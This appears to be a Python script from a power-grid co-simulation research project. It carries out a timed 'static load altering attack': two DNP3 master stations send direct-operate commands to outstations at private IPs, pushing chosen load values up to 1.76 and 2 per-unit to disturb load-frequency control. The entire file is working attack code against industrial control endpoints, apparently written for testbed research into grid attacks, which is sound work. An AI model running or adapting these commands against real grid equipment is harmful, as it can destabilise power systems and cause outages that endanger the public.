import logging
import time

from cosim.mylogging import getLogger
from cosim.dnp3.soe_handler import SOEHandlerAdjusted
from cosim.dnp3.lfc.LFC_master import MasterStation

_log = getLogger(__name__, "logs/d_r_lfc_slaa.log")

class SLAASOEHandler(SOEHandlerAdjusted):
    def __init__(self, log_file_path="logs/soehandler.log", soehandler_log_level=logging.INFO, station_ref=None, station_ref2=None, attack_time=30, loads=[0]*18, *args, **kwargs):
        super().__init__(log_file_path, soehandler_log_level, station_ref, *args, **kwargs)
        self._station_ref2 = station_ref2
        self._attack_time = attack_time # seconds
        self._loads = loads # in p.u. (min 0.5, max 2)
        self._can_attack = False
        self._wait_then_attack()
        
        
    def _wait_then_attack(self):
        _log.info(f"Waiting {self._attack_time} seconds before starting the attack...")
        time.sleep(self._attack_time)
        _log.info("Starting the attack now!")
        _log.info(f"Changing loads to {self._loads} p.u.")
        self._can_attack = True


    def _process_incoming_data(self, info_gv, visitor_ind_val):
          if self._can_attack:
              for i, load_change in enumerate(self._loads): 
                if load_change != 1.0:
                    if i < 10:
                        self.station_ref.send_direct_point_command(40, 4, i, load_change)
                    else:
                        self.station_ref2.send_direct_point_command(40, 4, i, load_change)
            

def main():
    logs_file = "logs/d_r_lfc_slaa.log"
    outstation_ip = "172.24.14.212"
    port = 20001
    outstation_ip2 = "172.24.14.213"
    port2 = 20002
    step_time = 100 # ms
    
    attack_time = 15
    loads = [1] * 18
    loads[2] = 1.76
    loads[7] = 2
    
    master = MasterStation(outstation_ip=outstation_ip, port=port, master_id=1, outstation_id=2, log_handler=None)
    master2 = MasterStation(outstation_ip=outstation_ip2, port=port2, master_id=1, outstation_id=2, log_handler=None)
    soe_handler = SLAASOEHandler(logs_file, station_ref=master, station_ref2=master2, attack_time=attack_time, loads=loads)
    master.configure_master(soe_handler, outstation_ip, port, scan_time=step_time)
    master.start()
    master2.start()
    
    time.sleep(1_000_000_000)
    del master
    exit()
    

if __name__ == "__main__":
    main()